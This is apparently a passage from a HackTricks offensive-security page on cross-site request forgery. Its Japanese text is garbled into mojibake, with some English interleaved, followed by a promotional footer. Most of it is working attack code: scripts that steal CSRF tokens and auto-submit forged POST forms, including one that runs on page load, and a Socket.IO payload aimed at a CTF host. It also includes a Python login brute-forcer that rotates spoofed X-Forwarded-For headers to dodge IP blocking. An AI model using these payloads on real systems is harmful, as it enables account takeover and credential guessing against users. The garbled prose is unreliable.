ã¾ãšã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€ãƒšãƒ¼ã‚¸ã«å¯¾ã—ã¦Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/csrf/page', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    var csrfToken = extractCsrfToken(response);
    sendPostRequest(csrfToken);
  }
};
xhr.send();
```

Next, we extract the CSRF token from the response of the Ajax request. The `extractCsrfToken` function is a placeholder for your own implementation.

æ¬¡ã«ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã¾ã™ã€‚`extractCsrfToken`é–¢æ•°ã¯ã€ç‹¬è‡ªã®å®Ÿè£…ã«ç½®ãæ›ãˆã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Finally, we use the stolen CSRF token to send a POST request using a form. We create a hidden input field in the form with the name `csrf_token` and set its value to the stolen CSRF token. Then, we submit the form programmatically.

æœ€å¾Œã«ã€ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ã£ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ãƒ•ã‚©ãƒ¼ãƒ å†…ã«`csrf_token`ã¨ã„ã†åå‰ã®éè¡¨ç¤ºã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ä½œæˆã—ã€ãã®å€¤ã‚’ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã«è¨­å®šã—ã¾ã™ã€‚ãã®å¾Œã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§é€ä¿¡ã—ã¾ã™ã€‚

```javascript
function sendPostRequest(csrfToken) {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = '/path/to/post/endpoint';
  
  var csrfInput = document.createElement('input');
  csrfInput.type = 'hidden';
  csrfInput.name = 'csrf_token';
  csrfInput.value = csrfToken;
  
  form.appendChild(csrfInput);
  document.body.appendChild(form);
  
  form.submit();
}
```

By using this technique, we can steal the CSRF token from the target website and use it to perform unauthorized actions on behalf of the user.

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä»£ã‚ã‚Šã«ä¸æ­£ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOã‚’ä½¿ç”¨ã—ãŸCSRF

Socket.IOã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªåŒæ–¹å‘é€šä¿¡ã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã®JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªé€šä¿¡ã‚’è¡Œã†Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã«ã•ã‚‰ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

CSRFæ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ãƒ‡ãƒ¼ã‚¿ã‚’ä¹—ã£å–ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€CSRFæ”»æ’ƒã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€Socket.IOã‚’ä»‹ã—ã¦ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªé€šä¿¡ã‚’è¡Œã†Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
2. æ”»æ’ƒè€…ã¯ã€è¢«å®³è€…ã«ãªã‚Šã™ã¾ã—ã¦Socket.IOã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã¾ã™ã€‚
3. æ”»æ’ƒè€…ã¯ã€Socket.IOã‚’ä»‹ã—ã¦æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ãªCSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

1. ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã‚’ä½¿ç”¨ã—ã¦Socket.IOã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’èªè¨¼ã™ã‚‹ã€‚
2. ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆCSRFãƒˆãƒ¼ã‚¯ãƒ³ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ­£å½“æ€§ã‚’æ¤œè¨¼ã™ã‚‹ã€‚

ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã‚’ä½¿ç”¨ã—ã¦Socket.IOã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’èªè¨¼ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä¹—ã£å–ã‚‹ã“ã¨ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é€ä¿¡å…ƒãŒä¿¡é ¼ã§ãã‚‹ã‚‚ã®ã§ã‚ã‚‹ã‹ã‚’æ¤œè¨¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸Šã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€Socket.IOã‚’ä½¿ç”¨ã—ãŸWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFãƒ­ã‚°ã‚¤ãƒ³ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼ˆã¾ãŸã€å¯èƒ½ãªIPãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆå›é¿ã®ãŸã‚ã«X-Forwarded-Forãƒ˜ãƒƒãƒ€ãƒ¼ã‚‚ä½¿ç”¨ã—ã¦ã„ã¾ã™ï¼‰ã€‚
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ãƒ„ãƒ¼ãƒ« <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã‚¦ã‚§ãƒ–3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã¶ãŸã‚ã«**

ğŸ ã‚¦ã‚§ãƒ–3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³**](https://opensea.io/collection/the-peass-family)
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«PRã‚’æå‡ºã—ã¦** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã‚’åˆ©ç”¨ã—ã¦ãã ã•ã„ã€‚**

</details>
